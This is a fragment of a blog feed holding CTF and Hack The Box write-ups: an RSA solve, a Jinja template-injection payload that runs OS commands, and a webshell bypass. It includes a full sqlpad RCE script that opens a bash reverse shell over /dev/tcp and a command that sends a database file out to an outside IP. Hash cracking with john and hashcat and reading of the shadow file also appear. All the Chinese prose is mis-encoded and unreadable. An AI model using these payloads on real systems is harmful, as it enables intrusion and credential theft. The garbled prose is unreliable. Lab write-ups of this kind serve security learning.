class="number">22902312247655401296387615153281693620508461675505550317014209779502324214659038625188644637684716596785654730362837135937428752578933369019876636781124643639177120407643147914932174261971465557310189161493208155563664026848239936362156630547829709710807347851602425752221503380034034698661113182854841894544095158900943963238561984113656414774368904280961218734260452412174079292884439126146014019436972752206205693555122285611179454949492032296806502438320826316045303787587136393481831244686573244792681592851889782650510393778231713816763010638656123304973975140552936712841614459233740391987488047517403600664177</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">10925650797594460612059722201596610933207264502326819848042775320957258158018275605482510808372512594051200222145936489078816364135810892640917713113068503152152242704988045516265090312225293558139219203431287178987229023062505356034246693655652192200324933320428405891200794854131034462963388024373314403868375571984277004371368582051660493956317530739125058003324429907207332861597713305361198480099466903431836693515104766242032956465615652468253631405615750342178243913852667249495988156267323915974111754007207991602051250521499638553489086363424935888718304716566925038325795617459612928478694750644540123489040</span></span><br><span class="line"></span><br><span class="line">hint3 = <span class="number">3855651325057194887972748506776457858934175512007314643076624103686879599280541006266987104821156151361711778969477814937770854325818184386384209471137555059136561996198802530628880456082386621118628839560185794434935871085733536602515294932732781224397538222047978348801727498256181418404928760447528350392887109183676665897758431671715736181046318754153743290687151730056417997835932648291568374055937072777280311412489299276441100000409306149688383961487334426823908899881912689052275547072583202669593768624681608263488675488219230004581882489398517548459754749590298003983834065191538258319844568477191703747977</span></span><br><span class="line"></span><br><span class="line">inverse_ = gmpy2.invert(hint3,n2)</span><br><span class="line"></span><br><span class="line">p2, q2 = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">equation_1 = Eq(<span class="number">514</span> * p2 - <span class="number">114</span> * q2, inverse_)</span><br><span class="line"></span><br><span class="line">equation_2 = Eq(p2 * q2, n2)</span><br><span class="line"></span><br><span class="line">solution = solve([equation_1, equation_2], [q2, p2])</span><br><span class="line"></span><br><span class="line">prime_p1 = <span class="built_in">int</span>(<span class="built_in">abs</span>(solution[<span class="number">1</span>][<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">prime_q2 = <span class="built_in">int</span>(<span class="built_in">abs</span>(solution[<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">d2 = inverse(<span class="number">65537</span>, (prime_p1 - <span class="number">1</span>) * (prime_q2 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1 + flag2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h3><p>è¿™é¢˜ç›´æ¥æŠŠæºç dumpä¸‹æ¥çœ‹çœ‹</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235453296.png" class=""><p>ä¸»è¦éœ€è¦è¿›è¡Œpostä¼ å‚æ•°å¯ä»¥è€ƒè™‘çš„æ˜¯pythonå†…å­˜ğŸä½†æ˜¯è¿™é‡Œæ²¡æœ‰å°è¯•å‡ºæ¥,è¿™äº›è¿‡æ»¤çš„å­—ç¬¦å¯ä»¥ç”¨16è¿›åˆ¶ç»•è¿‡</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235503193.png" class=""><p>åªå°è¯•åˆ°è¿™é‡Œåé¢æƒ³åˆ°ç”¨æ–‡ä»¶è¦†ç›–çœ‹çœ‹è¦†ç›–app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25<span class="built_in">set</span>%<span class="number">20</span><span class="built_in">globals</span>=<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;globals&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20builtins=<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20impor=<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;i&#x27;</span><span class="string">&#x27;mport&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%7D%7B%25<span class="built_in">set</span>%20command=<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>%<span class="number">25</span>%7D%7B%7Bcycler.<span class="built_in">next</span>%5Bglobals%5D%5Bbuiltins%5D%5Bimpor%5D(command)%5<span class="string">B&#x27;s&#x27;</span><span class="string">&#x27;ystem&#x27;</span>%5D(<span class="string">&#x27;cat%20/flag%20%3E%20app.py&#x27;</span>)%7D%7D%0A</span><br></pre></td></tr></table></figure><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235514424.png" class="">å†æ¬¡è®¿é—®é¦–é¡µ<img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235533473.png" class=""><h3 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h3><p>è®¿é—®ç›´æ¥è·³è½¬åˆ°</p><p>file</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235547223.png" class=""><p>è¿™é‡Œè¯·æ±‚å¤´æ˜¯æœ‰æç¤ºçš„æ˜¯htmlåŠ å¯†çš„include.phpæ–‡ä»¶ã€‚æ‰€ä»¥å°è¯•æ–‡ä»¶åŒ…å«ï¼Œæºç ç†ç”±hackme.php tips.php</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235556033.png" class=""><p>Tipsæ˜¯ä¸€ä¸ªphpinfoé¡µé¢</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235609075.png" class=""><p>è§£å¯†ä¸€ä¸‹æ··æ·†ä»£ç </p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235631273.png" class=""><p>å‘ç°æ˜¯ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ‰€ä»¥è¿›è¡Œè¿æ¥</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235639003.png" class=""><p>å› ä¸ºæœ‰_æ‰€ä»¥ç”¨[ç»•è¿‡</p><img src="/2024/12/30/CTF/WP/2024Ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AFWp/IMAGE20241230235648858.png" class=""><p>ä½¿ç”¨php7_UserFilteræ’ä»¶ç»•è¿‡<br>ç„¶åfind &#x2F; -name flag å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sightless</title>
      <link href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Sightless/"/>
      <url>/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Sightless/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -O <span class="number">10.10</span><span class="number">.11</span><span class="number">.32</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰«æç»“æœå¦‚ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734147903011-ffa92bfa-0cfe-4a40-879c-4e8817abd865.png"></p><p>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†ftpç«¯å£å’Œ80ç«¯å£è¿˜æœ‰ä¸€ä¸ªåŸŸå,å…ˆæŠŠåŸŸåæ·»åŠ åˆ°hostsé‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734150868038-55569533-f486-4de7-b56f-5826a88b1250.png"></p><p>å°è¯•ftpåŒ¿åç™»å½•å‘ç°å¤±è´¥äº†ï¼Œæ‰€ä»¥æ¥çœ‹çœ‹ç½‘ç«™ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734150992689-89ee74ce-8863-4860-bf24-f295eb32c177.png"></p><p>æŸ¥çœ‹é¡µé¢æºç å‘ç°äº†ä¸€ä¸ªå­åŸŸåï¼Œä¹Ÿç»™åŠ å…¥åˆ°hostsé‡Œï¼Œç„¶åè®¿é—®ä¸€ä¸‹è¿™ä¸ªå­åŸŸå</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734151323300-0bfd42bc-9a61-4d07-adae-843eb1047b65.png"></p><p>è¿™é‡Œä¼šæ˜¾ç¤ºsqlpadçš„ç‰ˆæœ¬å·</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å»ç½‘ä¸Šæ‰¾ä¸€ä¸‹çœ‹çœ‹sqlpadçš„æ¼æ´</p><p><a href="https://github.com/worm-403/scripts">https://github.com/worm-403/scripts</a></p><p><a href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944</a></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªrceæ¼æ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">#Remember to put the Netcat on the listening port</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">IP=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">PORT=<span class="string">&quot;<span class="variable">$&#123;2&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$&#123;@&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Add IP and PORT&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Example: ./exploit.sh IP PORT&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload=$(<span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;worm&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;driver&quot;: &quot;mysql&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;data&quot;: &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;database&quot;: &quot;&#123;&#123; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/$&#123;IP&#125;/$&#123;PORT&#125; 0&gt;&amp;1\&quot;&#x27;) &#125;&#125;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">response=$(curl -s -X POST <span class="string">&#x27;http://sqlpad.sightless.htb/api/connections&#x27;</span> \</span><br><span class="line"></span><br><span class="line">-H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line"></span><br><span class="line">-d <span class="string">&quot;<span class="variable">$payload</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$response</span>&quot;</span> | jq -r <span class="string">&#x27;.id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">curl -s <span class="string">&quot;http://sqlpad.sightless.htb/api/connections/<span class="variable">$&#123;id&#125;</span>/schema&quot;</span> &amp;&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734151629727-7bf9cb14-d95e-41e5-a2e9-813b2007a16b.png"></p><p>æ‹¿åˆ°äº†shell</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734151725237-de976ada-e6fb-4127-b69d-a48e8fc92139.png"></p><p>å‘ç°äº†ä¸€ä¸ªsqliteï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨sqliteçš„è¯­æ³•è¿›è¡ŒæŸ¥çœ‹ä¸€ä¸‹ï¼Œä½†æ˜¯ä»–æœ¬æœºæ²¡æœ‰sqlite3è¿™ä¸ªå‘½ä»¤æ‰€ä»¥æˆ‘ä»¬æ‹¿åˆ°æœ¬åœ°è¿›è¡ŒæŸ¥çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">cat</span> sqlpad.sqlite &gt;&amp; /dev/tcp/10.10.16.10/1234 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlite3 sqlpad.sqlite</span><br><span class="line"></span><br><span class="line">.table</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * from user;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152241370-28d89107-11b7-4de2-aa87-81fea579ff43.png"></p><p>å‘ç°äº†ä¸€äº›ç”¨æˆ·çš„å‡­è¯ä¿¡æ¯å¯ä»¥ç”¨hashidè¯†åˆ«ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152806948-064999a1-868d-4d97-a89b-5a646cfba2fa.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯bryptæ‰€ä»¥å¯ä»¥çˆ†ç ´ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152288623-a6d494d1-259b-4caa-913b-767366e76257.png"></p><p>åœ¨çˆ†ç ´çš„åŒæ—¶åœ¨ä»–æœ¬æœºçš„æœºå™¨ä¸ŠæŸ¥çœ‹shadowæ–‡ä»¶å‘ç°äº†rootå’Œmichaelç”¨æˆ·çš„hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt htb.hash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¼€å§‹è¿›è¡Œçˆ†ç ´æ™®é€šç”¨æˆ·çš„å¯†ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152610716-a949dd51-3832-48b1-b44a-f6a172762698.png"></p><p>å¯ä»¥çˆ†ç ´å‡ºæ¥æ‰€ä»¥æˆ‘ä»¬ç™»å½•ä¸€ä¸‹ä»–çš„æœºå™¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734152930610-06e63a6f-2ed2-44b3-9ec2-6821714e5cb8.png"></p><p>å¯ä»¥æ‹¿åˆ°ä»–çš„user flag</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŠŠå°ä¹Œé¾Ÿçš„è„šæœ¬ä¸Šä¼ ä¸€ä¸‹inpeas.shçœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„å—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rsync linpeas.sh michael@10.10.11.32:/home/michael</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ‰«æç»“æœ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734153686187-0eda924a-f415-45ac-93c7-c03f3b9d70fd.png"></p><p>å¼€èµ·äº†80 ç«¯å£å’Œ8080ç«¯å£æˆ‘ä»¬æ˜ å°„å‡ºæ¥çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734153810783-c389f045-4722-4963-a345-bef82fe453c3.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå»æœäº†ä¸€ä¸‹è¿™ä¸ªæ¡†æ¶çš„æ´æ‰¾ä¸åˆ°ã€‚å¦å¤–å‘ç°è¿™ä¸ªjohnç”¨æˆ·åœ¨è¿œç¨‹è°ƒè¯•è°·æ­Œæµè§ˆå™¨ï¼Œä¹‹å‰æ²¡äº†è§£è¿‡å»æŸ¥æŸ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734153613378-d2f7e82f-0b18-406d-bd11-223711a33f43.png"></p><p>å‚è€ƒä¸€ä¸‹è¿™ä¸ªæ–‡ç« ï¼š<a href="https://blog.51cto.com/u_15061934/4075994">https://blog.51cto.com/u_15061934&#x2F;4075994</a>äº†è§£è¿œç¨‹è°ƒè¯•</p><p>å…ˆå°†è°ƒè¯•çš„ç«¯å£è½¬å‘åˆ°æœ¬åœ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -L 35871:127.0.0.1:35871 michael@10.10.11.32</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734155964871-6ee59ac3-4202-43db-a890-f4f0e34e25f7.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734156308082-eeff4d88-f678-400f-8a8e-dda8577f166f.png"></p><p>å¼€å¯ä¸€ä¸‹è¿™ä¸ªfpm</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734156089628-6c948bb8-c476-448c-924a-35c0ea26e884.png"></p><p>è¿™æ—¶å€™ç”±äºæ²¡æœ‰æƒé™æ‰€ä»¥chmod 77 &#x2F;tmp&#x2F;id_rsaåœ¨æ‹–åˆ°æœ¬åœ°åœ¨æ‰§è¡Œä¸€æ¬¡å°±å¯ä»¥äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734160724865-3f216b8e-c64d-40ab-a549-92d698c09d66.png"></p><p>è·å–rootçš„å¯†é’¥ç™»å½•æ‹¿åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sea</title>
      <link href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Sea/"/>
      <url>/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Sea/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sC -sV -O <span class="number">10.10</span><span class="number">.11</span><span class="number">.28</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734504879061-5c3f3318-02f2-4d8f-8e65-709ebd29bf9e.png"></p><p>è¿™æ˜¯æ‰«æç»“æœå¼€æ”¾äº†80ï¼Œ22ç«¯å£å»è®¿é—®80ç«¯å£çœ‹çœ‹ä¿¡æ¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734505078956-325ea2fb-637e-4dc6-b418-ae9ef38dd08a.png"></p><p>åœ¨ç‚¹å‡»è¿™ä¸ªcontacté“¾æ¥çš„æ—¶å€™ç»™æˆ‘ä»¬è·³åˆ°ä¸€ä¸ªåŸŸåä¸Šå»äº†å‘ç°è®¿é—®ä¸äº†æ‰€ä»¥è€ƒè™‘åŠ å…¥hostsè§£æã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734505486604-eb683fdf-df38-4b06-b070-211cf7df1db1.png"></p><p>ç„¶åæˆ‘ä»¬ç”¨dirsearchã€gobusteråŒæ—¶æ‰«æä¸‹ç›®å½•çœ‹çœ‹æœ‰ä»€ä¹ˆå‘ç°ï¼Œè¿™æ˜¯dirsearchçš„ç»“æœ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734505427746-2bf12118-6207-4b47-ade4-c63089419351.png"></p><p>å¯ä»¥çœ‹åˆ°æ‰«æå‡ºçš„ç»“æœéƒ½æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåœ¨é¡µé¢ç‚¹å‡»åˆ°çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://sea.htb -w /usr/share/dirbuster/wordlists/directory-<span class="built_in">list</span>-<span class="number">2.3</span>-medium.txt -x ,.php,.<span class="built_in">zip</span>,.rar,.txt,.html,.git,.svn</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨æ‰«æçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å»æœç´¢ä¸‹cmsä¸­çš„ç‰¹å¾velik71æ‰¾åˆ°ä¸€ä¸ªæ¼æ´è·Ÿä»–æœ‰å…³ç³»å°è¯•åˆ©ç”¨ä¸€ä¸‹</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å‚è€ƒï¼š<a href="https://github.com/insomnia-jacob/CVE-2023-41425">https://github.com/insomnia-jacob/CVE-2023-41425</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734507794275-6f26f0f6-93ca-40a8-bc66-c7e8897c3476.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734507779460-4c94d948-d3f1-4f7b-8bf1-6b797d697fac.png"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ¥æ”¶åˆ°shell</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734507922009-e4f85342-95e1-4a38-a257-3d4162077973.png"></p><p>å»ç½‘ç«™æ ¹ç›®å½•ä¸‹&#x2F;var&#x2F;www&#x2F;sea&#x2F; ç¿»ç¿»æ–‡ä»¶ç¿»åˆ°ä¸€ä¸ªjsæ–‡ä»¶é‡Œé¢å­˜åœ¨å¯†ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734507989877-df25a064-12a1-4356-a5c8-3effe9005a75.png"></p><p>ä½¿ç”¨å­—å…¸çˆ†ç ´ä¸€ä¸‹ï¼Œè®°å¾—æŠŠ\å»æ‰åœ¨ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$2y$<span class="number">10</span>$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hashcat <span class="string">&#x27;$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q&#x27;</span> -m <span class="number">3200</span> /usr/share/wordlists/rockyou.tx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çˆ†ç ´å‡ºæ¥å¯†ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734513118285-3edeb020-8e6a-4e40-aab8-c021e2032d2e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734513171339-efab214f-84db-4cb5-a3ef-93a8e57148f7.png"></p><p>çœ‹åˆ°ä»–å®¶ç›®å½•ä¸‹æœ‰ä¿©ç”¨æˆ·ç™»å½•è¯•è¯•ï¼Œä½¿ç”¨amayç™»å½•æˆåŠŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734513493978-787a3f7a-d6c1-43a8-9685-8669785f2232.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734513730397-f716f4a2-2bea-4613-8dd7-6bc96e804b35.png"></p><p>çœ‹åˆ°å¼€æ”¾äº†8080 å’Œ 48551ç«¯å£ æ˜ å°„åˆ°æˆ‘ä»¬æœ¬åœ°è®¿é—®ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -L <span class="number">8080</span>:localhost:<span class="number">8080</span> amay@sea.htb</span><br><span 